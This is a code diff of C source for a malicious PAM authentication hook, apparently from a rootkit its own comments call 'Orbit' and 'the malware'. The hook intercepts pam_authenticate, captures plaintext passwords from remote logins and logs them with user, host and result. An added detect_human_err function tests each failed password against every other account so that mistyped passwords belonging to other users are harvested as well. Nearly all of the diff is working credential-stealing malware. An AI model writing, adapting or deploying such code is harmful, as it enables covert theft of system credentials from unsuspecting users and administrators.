@@ -5,29 +5,57 @@ extern char     buf[ SIZE_BUF ];
 
 struct pam_response *pam_get_password(pam_handle_t *pamh, char __attribute__((unused))*user, int __attribute__((unused))rkadmin, const char *prompt )
 {
-	struct pam_message msg;
-	struct pam_response *pam_resp = NULL;
-	const struct pam_message *pmsg;
-	const struct pam_conv *conv;
-	const void *convp;
-	int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");
+    struct pam_message msg;
+    struct pam_response *pam_response = NULL;
+    const struct pam_message *pmsg;
+    const struct pam_conv *conv;
+    const void *convp;
+    int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");
 
-	if ((pam_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS)
-		return NULL;
-	conv = convp;
-	if ( conv == NULL || conv->conv == NULL )
-		return ( NULL );
+    if ((pam_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS)
+        return ( NULL );
+    conv = convp;
+    if ( conv == NULL || conv->conv == NULL )
+        return ( NULL );
 
-	msg.msg_style = 1;
-	msg.msg = prompt;
-	pmsg = &msg;
-	conv->conv(1, &pmsg, &pam_resp, conv->appdata_ptr);
-	return (pam_resp);
+    msg.msg_style = PAM_PROMPT_ECHO_OFF;
+    msg.msg = prompt;
+    pmsg = &msg;
+    conv->conv( 1, &pmsg, &pam_response, conv->appdata_ptr );
+    return ( pam_response );
+}
+
+/*
+ * \fn uint8_t detect_human_err( const char *, const char *, char * )
+ * \brief The "detect_huan_error" function is designed to detect human errors. For instance, if I attempt an SSH connection using the password of another user, Orbit will check whether this password belongs to any other user on the system.
+ */
+uint8_t detect_human_err( const char *passwd, const char *user, char *o_user )
+{
+    struct passwd *user_info;
+    setpwent();
+    while ((user_info = getpwent()) != NULL)
+    {
+        if ( _orBit_strcmp( user_info->pw_name, user ) != 0 )
+        {
+            if  ( check_password( passwd, user_info->pw_name ) == PAM_SUCCESS )
+            {
+                _orBit_memcpy( o_user, user_info->pw_name, _orBit_strlen( user_info->pw_name ));
+                endpwent();
+                return ( PAM_SUCCESS );
+            }
+        }
+    }
+    endpwent();
+    return ( PAM_AUTH_ERR );
 }
 
 int pam_authenticate(pam_handle_t *pamh, int flags )
 {
     const char *service = NULL, *host = NULL, *user = NULL;
+    struct pam_response *pwd = NULL;
+    uint8_t res = 0;
+    int size = 0;
+
 	static int ( *orig_pam_authenticate ) ( pam_handle_t *, int  ) = NULL;
 	if ( ! orig_pam_authenticate )
 		orig_pam_authenticate = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_authenticate");
@@ -42,33 +70,38 @@ int pam_authenticate(pam_handle_t *pamh, int flags )
         if ( pam_get_item(pamh, PAM_RHOST, ( void * ) &host) != PAM_SUCCESS )
             return ( PAM_AUTH_ERR );
 	   
-        struct pam_response *pwd = pam_get_password(pamh, "", 0, "Password: ");
+        pwd = pam_get_password(pamh, "", 0, "Password: ");
+        if ( pwd == NULL )
+            return ( PAM_CONV_ERR );
         
-        uint8_t res = check_password( pwd, user );
-        // # If the condition is true, it means that a memory allocation error occurred in the function check_password.
-        if ( res == 1 )
-            return ( orig_pam_authenticate( pamh, flags ) );
-        int size = sprintf( buf, "%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, ( res == 0 ) ? "SUCCESS" : "ERROR");
-        const char  *filename = "/tmp/password";
-	    __asm__ volatile ("syscall" : "=a" (fd) : "a" (__NR_open ),
-		      "D" (filename), "S" (O_RDWR|O_APPEND|O_CREAT), "d" (0666) :
-		      "cc", "memory", "rcx", "r11");
+        res = check_password( pwd->resp, user );
+        // If the return of the function is different from PAM_SUCCESS, the error can be due to several reasons:
+        //      PAM_USER_UNKNOWN: The username is not present in the system.
+        //      PAM_BUF_ERR: Memory allocation error.
+        //      PAM_OPEN_ERR: The library containing the "crypt" symbol could not be opened.
+        //      PAM_SYMBOL_ERR: The "crypt" symbol was not found.
+        if ( res == PAM_USER_UNKNOWN || res == PAM_BUF_ERR || res == PAM_OPEN_ERR || res == PAM_SYMBOL_ERR )
+            return ( res );
         
-	    __asm__ volatile ("syscall" : : "a" ( __NR_write ),
-		      "D" ( fd ), "S" ( buf ), "d" ( size ) :
-		      "cc", "memory", "rcx", "r11");
-	    
-        __asm__ volatile ("syscall" : : "a" (__NR_close ),
-		      "D" ( fd ) :
-		      "cc", "memory", "rcx", "r11");
-        ( pwd != NULL ) ? free( pwd ) : 0X00;
+        if ( res == PAM_AUTH_ERR )
+        {
+            // The malware has the ability to take advantage of human errors to its benefit. For example, it often happens that when I connect via SSH to a machine, I enter the password of another account by mistake.
+            // Therefore, Orbit will analyze the "/etc/shadow" file and verify that the password entered by the user is not that of another user.
+            char    o_user[ PATH_MAX ];
+            if ( detect_human_err( pwd->resp, user, o_user ) == PAM_SUCCESS )
+                size = sprintf( buf, "DETECT_HUMAN_ERR:%s:%s\n", o_user, pwd->resp );
+        }
+        else
+            size = sprintf( buf, "%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, ( res == 0 ) ? "SUCCESS" : "ERROR");
+        // # Backup the username, password, host (source IP), and the value ERROR or SUCCESS.
+        __LOG( buf, size );
+        free( pwd );
         return ( res );
     }
     const char *service_su = "su";
     if ( err == PAM_SUCCESS && _orBit_strcmp( service, service_su ) == 0 )
     {
-        if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
-            return ( PAM_AUTH_ERR );
+        
     }
     return ( orig_pam_authenticate( pamh, flags ) );
 }
